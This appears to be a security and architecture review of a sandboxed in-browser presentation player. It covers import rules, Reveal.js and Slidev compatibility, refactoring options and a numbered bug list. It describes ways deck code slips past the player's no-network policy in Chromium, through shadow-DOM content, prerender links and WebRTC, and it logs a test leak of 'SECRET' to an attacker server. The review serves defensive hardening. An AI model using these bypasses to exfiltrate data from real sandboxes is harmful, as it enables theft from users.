**W9. Preparer blind spots (harmless today only because of CSP).** `querySelectorAll('*')` does not enter `<template>` contents, so everything inside `<template shadowrootmode="open">` survives untouched and becomes a live shadow root in the played document: external `<img src>`, `onerror` attribute, `<iframe src>`, `<link rel=stylesheet>`, `<a href=https://... target=_blank>` (`exp5` `declarative-shadow-dom`; the bootstrap's click canceller also misses links in shadow trees because the event target is retargeted). `<style>` text is never inspected (`@import`, `url()` surface only at run time). `srcset` is deleted without error. The classic `<noscript>` parsing differential does **not** apply (fragment parsing inherits scripting-enabled; tested).

**W10. Unknown / untestable here.** `<link rel=preconnect>` and `dns-prefetch` raise no CSP violation; my TCP listener saw no connection even from a no-CSP control page, because Playwright starts Chromium with `--disable-background-networking` -> inconclusive [U]. Memory exhaustion not tested (shared machine).

Reference facts for the redesign **[E]**: the normal prepared document is a secure context (`isSecureContext=true`, `crypto.randomUUID`, `crypto.subtle`, WebGL, OffscreenCanvas, AudioContext, `navigator.gpu` present) on both http://127.0.0.1 and https (self-signed) (`exp3`). A sandboxed document cannot reach into a child `about:blank` iframe (cross-origin `SecurityError`), so it cannot trivially obtain a fresh realm (`exp13`) - but self-navigation to a blob: document does give one (W3).

---

## 4. What in this design blocks the goal

### 4.1 (a) An ordinary multi-file Reveal.js ZIP

1. **Import gate.** No manifest -> "website build ZIP" error that points to the *Slidev* tool, or (with a README.md) the README opens as a document (1.3, 1.4). `engine` must equal `"slidev"` (`presentation-package.ts:19`, `:258`; `presentation-store.ts:7`, `:88`; `public/presentation.schema.json`).
2. **Single-HTML rule.** `<script src>`, `<link rel=stylesheet>`, relative `src` are rejected at Start (1.5); CSP is inline-only; no file map is passed to the frame.
3. **The repo's packer does not help.** `node tools/slidev/pack.mjs --dist <reveal project>` exits 0 and writes a 512 KB ZIP that fails with "Uncaught ReferenceError: Reveal is not defined": esbuild bundles each classic UMD script as a module, so the `Reveal`/`RevealNotes` globals are never created (`pack.mjs:113-153`) **[E]** (`exp8`).
4. **But plain textual inlining is enough.** The hand-inlined deck (no bundler: `<link>` -> `<style>`, `<script src>` -> inline text) plays in 376 ms with fragments, keys, overview, internal links, canvas, buttons **[E]** (`exp7`). Reveal.js 6.0.2 themes already embed their fonts as `data:` URIs (0 `@import`, 4 `url(data:font/woff...)` in `dist/theme/black.css`, 575 KB) **[E]**. Older Reveal themes and typical AI CSS import web fonts -> killed (1.6).
5. **Once inside, Reveal features that break:** F and S keys kill the deck; `data-src` lazy media kills it; `history:true` hash writes are dropped ("Not allowed to load local resource: blob:null/...#/one"); arrow keys do nothing until the user clicks the slide (bug B1); inline `onclick`, `alert()`, JS forms, external links are silently dead (section 6); markdown/math plugins that fetch files or load KaTeX/MathJax from a CDN cannot work [I].

### 4.2 (b) An ordinary `slidev build` dist ZIP

1. Same import gate ("website build ZIP").
2. `dist/index.html` (Slidev 53.1.0, default theme) contains `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans...">`, a CDN favicon, `<script type="module" crossorigin src="/assets/index-*.js">`, 5 `modulepreload` links, and 103 files under `assets/` (whole dist: 106 files, 1,924,407 bytes) referenced by absolute `/assets/` URLs **[E]**.
3. Repo packer on it: "Slidev packaging failed: External asset cannot be packaged: https://fonts.googleapis.com/css2?... Bundle it during the Slidev build." (`pack.mjs:81`) - both for base `/` and `--base ./` **[E]**.
4. With only that `<link>` deleted by hand the packer succeeds in 0.6 s (2.18 MB HTML), but playback dies at 578 ms: `SecurityError: Failed to execute 'replaceState' on 'History': A history state object with URL '' cannot be created in a document with origin 'null' and URL 'blob:null/...'` then "Failed to execute 'replace' on 'Location': '' is not a valid URL." - vue-router's default web history cannot work in a `blob:` document with an opaque origin **[E]** (`exp8`). That is why the starter forces `routerMode: memory`, `fonts.provider: none`, and disables presenter/record/monaco/drawings/pwa (`tools/slidev/slides.md:7-30`, `tools/slidev/vite.config.ts`).
5. So besides a file system, an ordinary Slidev build needs: an ES-module graph loader (static + dynamic imports), a usable URL/history for the router, tolerance for the external font link, and no kill-on-error.

### 4.3 (c) Editing sources with the preview updating

1. The Source tab is `<textarea readonly>` (`PresentationLibrary.astro:52`), filled from `PresentationFile.content` (`presentation-library.ts:311-320`). Typing has no effect **[E]**. The entry HTML itself is never shown (`presentation-package.ts:362`; it appears as "This binary or large file is preserved in the ZIP...").
2. The model is immutable: `PresentationPackage { manifest, html, files, archive: Blob, fileName, expandedBytes }` (`presentation-package.ts:34-41`); the original ZIP Blob is the only persisted thing; the store has `list/save/get/delete`, no update (`presentation-store.ts:130-189`); the player closes over one `html` string (`presentation-runtime.ts:221`).
3. For Slidev, source and playback are different artifacts ("Editing source alone does not update presentation.html", `pack.mjs:275`; UI note `PresentationLibrary.astro:53`). Nothing in the browser compiles Vue/Markdown/UnoCSS.
4. For Reveal.js and plain HTML decks the source *is* the playable artifact, so (c) needs only an editor + rebuild of the HTML string + player restart (250-400 ms per restart at <= 1 MB) + persistence.
5. Restart always begins at slide 1; there is no state hand-over, and a transient error while typing destroys the frame.

### 4.4 Essential vs incidental

**Essential to the security model (keep):**
- E1. Deck code never runs in the editor's origin (opaque origin via `sandbox` without `allow-same-origin`). All 14 data-access probes failed because of this.
- E2. No top-level navigation and no popups; lifecycle is inert-until-Start and destroy-on-Stop.
- E3. Typed, bounded, source-checked parent<->frame messages; nothing privileged is exposed to the frame.
- E4. Archive validation before decompression.
- E5. Editor CSP `script-src 'self'` (package markup can never execute in the editor).
- E6. A trusted intermediate runner in its own origin between editor and deck (the deck cannot reach it).

**Policy choices (sensible defaults, not load-bearing for protecting the editor):**
- P1. "No network" CSP. It gives offline determinism and privacy by default, but W1/W2 show it is not airtight in Chromium, so relaxing it selectively (e.g. fonts) would not cross a real boundary. It is the reason every CDN-based AI deck is rejected.
- P2. Missing sandbox/permission grants: `allow-forms` (JS forms dead), `allow-modals` (`alert/prompt` dead), `allow-popups` (reference links dead), `allow-downloads`, `allow-pointer-lock`, `fullscreen 'none'` (deck's own fullscreen rejects and, with I4, kills), `clipboard-write 'none'` (copy buttons).

**Incidental implementation choices that block the goal:**
- I1. Mandatory `qft-presentation.json` and the `engine:"slidev"` constant; "Slidev" hard-coded in UI and messages.
- I2. One self-contained HTML; no file map; preparer throws on any reference.
- I3. `blob:` document: relative URLs unresolvable, path `pushState/replaceState` throws, fragment navigation blocked.
- I4. Every uncaught error, rejection, resource error or CSP violation is fatal.
- I5. No `'unsafe-eval'` / `'wasm-unsafe-eval'`, `worker-src 'none'`, `frame-src 'none'` (none is a boundary inside an opaque sandbox, see W4).
- I6. Injected global CSS and dropped document metadata (B9, B6).
- I7. 24 MiB HTML cap combined with base64 inlining; 20 s ready timeout; ready tied to animation frames.
- I8. Immutable package + read-only viewer + store without update.

---

## 5. Extension points

### 5.1 Reusable pieces (by name)

| Piece | Location | Reuse | Smallest change needed |
| --- | --- | --- | --- |
| ZIP validator: `inspectDirectory`, `readEntry`/`extract`, `safePresentationPath`, `isIgnoredPath`, `PRESENTATION_LIMITS` | `presentation-package.ts:66-248` | Directly, for any project ZIP | Export a generic `readArchive(file) -> { entries, read(path) }`; today only the manifest, entry and text previews are extracted, binaries are just CRC-checked |
| Format sniffing | `presentation-package.ts:315-331` | The decision tree already recognises "website build" and "Slidev source" | Return a kind (`qft-presentation` / `static-site` / `slidev-source` / `lesson` / `markdown`) instead of throwing at `:323`, `:328`; make the manifest optional and synthesise one (entry = shallowest `index.html`; engine by content: `.reveal .slides` / `Reveal.initialize` vs `meta[property="slidev:version"]`) |
| Store | `presentation-store.ts` (two stores, atomic `transaction()` helper, quota/blocked error mapping) | Yes | DB version 2; widen `engine` (`:7`, `:88`); add `updatePresentation`; optional overlay store for edited files so autosave does not rewrite a 60 MiB ZIP; content hash for de-duplication; `validateInfo` must not fail the whole list |
| Player state machine `createPresentationPlayer` (stopped/loading/ready/error, token, timeout, focus, destroy) | `presentation-runtime.ts:221-295` | Engine-agnostic already (Reveal deck played unmodified) | `update(html)` or html getter; configurable error policy; optional initial slide/state; fix focus (B1) |
| Runner `presentationSandboxBootstrap` + `public/presentation-sandbox.html` | `:35-90` | Yes | Extend the load message with files; count child `load` events (see below) |
| Preparer `preparePresentationDocument` | `:158-218` | The natural place for URL rewriting | Resolve references against the project file map instead of throwing; fix `rootAttributes` |
| Bootstrap `presentationBootstrap` | `:93-152` | Yes | Add resolvers/shims (fetch, XHR, history, fragment links), non-fatal error reporting |
| Export `exportPresentationHtml` + `presentationRuntimeSource` | `:319-331` | Works for any single HTML, so unchanged once a project can be linked into one HTML | - |
| Library element (`tryOpenFile`, `showPackage`, source select + textarea, Present/fullscreen, ZIP/HTML download) | `presentation-library.ts`, `PresentationLibrary.astro` | Yes | The source viewer becomes the editor; CodeMirror 6 is already bundled, and `@codemirror/lang-html`, `lang-css`, `lang-javascript` are already in `node_modules` as dependencies of `lang-markdown` |
| Packer algorithm (`inlineCss`, `inlineAsset`, dynamic-import identity patch) | `tools/slidev/pack.mjs:80-153` | As a specification for an in-browser linker for Vite/ESM output | Not usable as-is for classic scripts (4.1.3) |
| fflate `zipSync` (already a dependency) | used in `document-bundle.ts:211` | Re-packing an edited project | - |

### 5.2 (i) Multi-file virtual file system - verified platform facts **[E]**

- A same-origin **service worker cannot feed an opaque-origin sandboxed iframe**: with a controlling SW, a frame without sandbox and one with `allow-scripts allow-same-origin` were served from the SW (`origin = site`, storage readable -> no isolation), while `sandbox="allow-scripts"` bypassed the SW and got the server's 404 page (`exp9`). So "SW + current sandbox" is not an option; SW-based serving needs a separate real origin, which GitHub Pages can only provide as another site/domain.
- **blob: URLs created by the runner are not loadable by the child** (different opaque origin): img, stylesheet, classic script, module, `fetch`, `import()`, Worker all fail with "Not allowed to load local resource: blob:null/..." (`exp17`).
- **blob: URLs created inside the child from Blobs that the runner sent with `postMessage` work for everything**: image, `<link rel=stylesheet>`, classic `<script src>`, ES module whose import specifier was rewritten to another child-created blob URL, `fetch()`, `import()`, Worker; 33 ms for the whole set in full Chromium, same in headless shell (`exp17b`). CSP used: the current one plus `blob:` in `script-src`, `style-src`, `font-src`, `connect-src`, `worker-src` - still no network source.
- Therefore the smallest VFS refactor that keeps E1-E6: (1) import keeps all files (`readArchive`); (2) load message becomes `{type, token, html, files: {path: Blob}}` (Blobs are passed by reference); (3) the child starts as a tiny loader document that receives the files, creates blob URLs, rewrites references (HTML attributes, CSS `url()`, module specifiers, in dependency order) and then writes the deck (`document.write`, as `public/demo-sandbox.html` already does), plus shims for run-time relative URLs (`fetch`/XHR, `data-src`-style attributes); (4) add `blob:` to the two policies in `presentation-runtime.ts:87` and `:193`.
- An even smaller first step for Reveal/classic sites needs **no** runtime or CSP change: link the project into one HTML in the editor (text inlining of `<link>`/`<script src>`, `data:` URIs for images/fonts/media and CSS `url()`), then hand that string to the existing player. Proven by `exp7` (818 KB, 376 ms). Limits: 24 MiB HTML cap with 1.33x base64 growth; ES modules cannot be inlined textually (they need the blob route or a bundler).
- Bundlers/compilers: WebAssembly is **blocked** in the editor document and in blob workers by the editor CSP ("violates ... 'unsafe-eval'"), but **allowed in a same-origin network worker** (a worker script served from the site has its own, here empty, policy) (`exp9`, Chromium 158; other engines [U]). The portable fix is `'wasm-unsafe-eval'` in `BaseLayout.astro:22`. `crossOriginIsolated=false` and `SharedArrayBuffer` undefined on this hosting (no COOP/COEP headers on GitHub Pages) -> anything that needs cross-origin isolation is out unless headers are emulated. `es-module-lexer` is already in `node_modules` (transitive) and `esbuild` 0.28.2 is a devDependency (native binary, build-time only); `esbuild-wasm` is not installed.
- The blob: document's URL limits (I3) remain with any blob approach: routers need `history`/`location` shims, and fragment navigation needs emulation.

### 5.3 (ii) Editable project model - smallest refactors

1. Replace `PresentationPackage.html/files` by a project: `{ id, manifest, entry, files: Map<path, { bytes | text, type, dirty }> }`; `html` becomes derived: `link(project) -> string`.
2. Editor: CodeMirror in place of the readonly textarea; on change (debounced) -> `link` -> `player.update(html)`.
3. Keep the slide across restarts: the bootstrap reports a position (Reveal `Reveal.getState()`, or `location.hash`) with a new bounded message kind and receives it back on load.
4. Make errors non-fatal by default (overlay/notice, keep the frame); keep "fatal" as an option.
5. Persistence: `updatePresentation` (or an edits overlay), re-zip with fflate for download; `navigator.storage.persist()` is never requested today (no match in `src/`), so the library is best-effort storage.
6. Slidev *source* editing additionally needs an in-browser compile step; that is outside the player and is the costliest part.

### 5.4 Hardening that fits the same refactor

- Runner-side navigation watchdog: `frame.addEventListener('load', ...)` in the runner fires for every child navigation; a second load means the deck replaced its document (W3) -> report and kill. This cannot be tampered with by the package.
- With that in place, removing `RTCPeerConnection`/`webkitRTCPeerConnection` in the bootstrap and guarding `<link rel=prerender>` insertion become best-effort mitigations for W2/W1 (no declarative control exists in Chromium 158). They reduce, not eliminate, the exposure; the UI wording should match.
- Message-rate limit in the host listener (W7); never render `detail` as if it came from the app (prefix it, W5).
- Add `allow-forms` (with `form-action 'none'` kept) and consider `allow-modals`, `allow="fullscreen"` delegation, `clipboard-write`.

---

## 6. Bugs, edge cases, UX defects

| # | Sev. | Defect | Where | Reproduction / evidence |
| --- | --- | --- | --- | --- |
| B1 | High | **Keyboard does not reach the deck after Start or Present in real Chromium.** Top `activeElement` is the iframe, but runner and deck report `document.hasFocus() === false`; ArrowRight does nothing until the user clicks the slide. Console: "Permissions policy violation: focus-without-user-activation is not allowed in this document." from `presentation-sandbox.html`. The UI says "Use the slide controls or arrow keys". Works in headless shell, so CI is green | `presentation-runtime.ts:72` (runner focuses its child without owning focus), `:273` (outer iframe focused before it loads), `:289-292` (`focus()` on an element that is already `activeElement` is a no-op); `presentation-library.ts:346` | `exp7b` (Reveal and the shipped Slidev example, Start and Present). **Repair verified** (`exp7c`): after `ready`, `iframe.blur(); iframe.focus()` in the editor -> runner gains focus; then the existing `qft-presentation-focus` message -> deck has focus; ArrowRight advances |
| B2 | High | Any uncaught error, unhandled rejection, element `error` event or CSP violation destroys the running presentation and resets to slide 1 | `:127-134`, `:237-245`, `:283` | `exp5`: late error -> killed at ~1.05 s; click handler `null.x` -> killed; one corrupt inline image -> killed at 220 ms; Reveal F / S keys (`exp7`, `exp7d`) |
| B3 | High | Standard ZIPs are mis-routed or mis-described (1.3, 1.4): Reveal + README opens the README as a lesson; Reveal users are told to use the Slidev packager; `slides.md`-only opens as raw Markdown; Markdown ZIP with `slides.md` + `.vue` is refused as Slidev source; source+dist is called source-only | `presentation-package.ts:291-301`, `:322-330`; `markdown-workspace.ts:1377-1384`; `presentation-library.ts:71` | `exp1`, `exp1b`, `exp11` |
| B4 | Med | Unplayable packages are accepted, stored, listed, and fail only at Start | prepare is called in `start()` (`presentation-runtime.ts:252`); import checks only `<html`/`<body` (`presentation-package.ts:350`) | `exp1`: 4 such packages each created the `qft-presentations` DB record |
| B5 | Med | A failure during fullscreen is invisible: the notice (`PresentationLibrary.astro:14`) and status (`:48`) are outside the fullscreen element (`:38`); the presenter just sees the start card again | as cited | `exp11`, `shots/exp11-error-in-fullscreen.png` (stage text: "SLIDEV Late failure Slides and demonstrations run locally when you press Start. Start presentation ...") |
| B6 | Med | `rootAttributes()` regex: (a) a `>` inside any body attribute value (e.g. Tailwind `class="[&>p]:mt-2"`) drops **all** body attributes; (b) `id` is never kept on `<html>`/`<body>`; (c) a `<body ...>` string inside a script in `<head>` is taken as the real body tag | `presentation-runtime.ts:201-210` | `exp16`: `bodyClass:""`, `bodyId:""`, `bodyStyle:null`; second case `bodyClass:"from-a-js-string"` while the real class is lost |
| B7 | Med | Fragment navigation is dead in the player although the bootstrap lets `#` links through: `<a href="#x">` click, `location.hash=`, `location.href='#x'`, `location.replace('#x')` -> "Not allowed to load local resource: blob:null/...#x"; no scroll, no `hashchange`. `history.replaceState/pushState('#...')` work; path URLs throw `SecurityError` | `:142-145`; blob: document | `exp3` (http and https), `exp5` `external-link-and-anchor`, `exp7` `history:true` |
| B8 | Med | Silent loss of common interactions: JS-handled forms never get `submit` ("Blocked form submission ... 'allow-forms' permission is not set"); `alert/confirm/prompt` are ignored (`prompt` -> `null`); inline `onclick` is stripped (button does nothing; the editor console also logs "Executing inline event handler violates ... 'script-src 'self''" from template parsing); external links lose `href` and `target`; `srcset` and `<source srcset>` are removed (image with only `srcset` -> `naturalWidth 0`) | `:65`, `:258` (sandbox), `:180`, `:187` | `exp5`: `js-form-submit-handler`, `alert-then-update`, `inline-onclick-attribute`, `external-link-and-anchor`, `srcset-and-picture` |
| B9 | Med | The prepared document alters layout: injects `html,body{margin:0;width:100%;height:100%;overflow:hidden}`, `body{font-family:system-ui,sans-serif}`, `*,*::before,*::after{box-sizing:border-box}`; removes `<title>` and the deck's viewport meta; forces standards mode; moves head content into body | `:177`, `:212` | `exp5`: a `width:200px;padding:50px` box is 200 px wide instead of 300; page cannot scroll (`scrollHeight == innerHeight`). `exp16`: `document.title === ""`, `compatMode CSS1Compat` for a doctype-less deck, head script sees `document.body` |
| B10 | Low | No de-duplication: every import adds a record; every example click and every visit of the documented deep link `?presentation=slidev-example` stores another 1.6 MB copy | `presentation-store.ts:142-158`; `presentation-library.ts:99-104`, `:370-380` | `exp11`: same ZIP twice -> 2 rows; example twice -> 2 rows; deep link twice -> 2 rows |
| B11 | Low | One record that fails `validateInfo` (e.g. a future `engine` value) makes `listPresentations()` reject, so the whole library looks empty | `presentation-store.ts:84-97`, `:130-139` | code [P] |
| B12 | Low | Deck `pushState` pollutes the tab's history (W8) | - | `exp5` `history-entries` |
| B13 | Low | Manifest schema and parser disagree: schema has `additionalProperties:false` and no extension rules; parser accepts unknown properties (played) and requires `.html?` entry and `.md` source | `public/presentation.schema.json`; `presentation-package.ts:250-284` | `exp1b` |
| B14 | Low | Packer vs browser: path limit 400 vs 1024; packer rejects any external stylesheet link, including Slidev's default Google Fonts link; packer "succeeds" on classic-script sites and emits a broken package | `pack.mjs:49`, `:81`, `:113-153` | `exp8` |
| B15 | Low | `ready` needs two animation frames; a tab hidden during loading cannot become ready while the 20 s timer still runs -> false "has not finished loading" | `presentation-runtime.ts:147-151`, `:270-272` | [I] - headless Chromium keeps pages "visible" (`exp12`), not reproduced |
| B16 | Low | CI cannot see B1, W1 or W6: default headless shell (no out-of-process frames, no prerender), and the test clicks inside the deck before pressing keys | `tests/browser/presentations.mjs:57`, `:119`; `.github/workflows/check.yml:48-51` | [P] + behaviour differences measured above |
| B17 | Info | Structural limits and the wording "This presentation ZIP could not be opened..." also hit Markdown/lesson ZIPs, because sniffing runs first (> 1000 entries, ZIP64, method != 0/8, > 60 MiB) | `presentation-package.ts:309-315` | `exp1` (`zip-1001-entries-no-manifest`, `not-a-zip-renamed`) |
| B18 | Info | Escape while focus is on the dialog chrome closes the dialog and destroys the running deck without confirmation | `presentation-library.ts:74-87` | `exp11` |
| B19 | Info | "SLIDEV" badge, "Slidev · N files", dialog title and iframe title are hard-coded for any content | `PresentationLibrary.astro:11`, `:41`; `presentation-library.ts:135`, `:266`; `presentation-runtime.ts:257` | [P] |
| B20 | Info | `docs/ARCHITECTURE.md` and `docs/VERIFICATION.md` contain no description of the presentation player (0 matches for "slidev"); only README and guide do. `public/presentation-sandbox.html` is a checked-in generated file with no generator script (a unit test enforces equality, `tests/presentation-runtime.test.ts:109`) | - | grep [E] |

---

## 7. Open questions / not verified

- Firefox and Safari behaviour for W1, W2, B1, B7 and for a sandboxed frame navigating its non-top ancestor (only Chromium is installed).
- B1 and W1 were additionally confirmed in a **headed** full Chromium 158 window under Xvfb (`xvfb-run -a node exp18-headed.cjs`, `logs/exp18-headed.json`): after Start the shipped Slidev example stays on "Phase makes the difference." on ArrowRight and advances to "Amplitudes add." only after a click in the slide; the attacker server received `/headed-prerender?leak=SECRET` (`Sec-Purpose: prefetch`) while the host showed "Playing locally". Playwright emulates window focus, so a manual check on a physical desktop is still a cheap final confirmation of B1.
- Whether real Chrome with the user's "Preload pages" setting off suppresses W1 [U]; preconnect/dns-prefetch leakage (W10).
- Whether WASM in a same-origin network worker (allowed in Chromium 158) is allowed in Firefox/Safari under the same meta CSP.
- Hidden-tab readiness (B15) on a real desktop.
- Memory exhaustion by a package; behaviour of the player on Android Chrome (same-process sandboxed frames per Chromium docs).
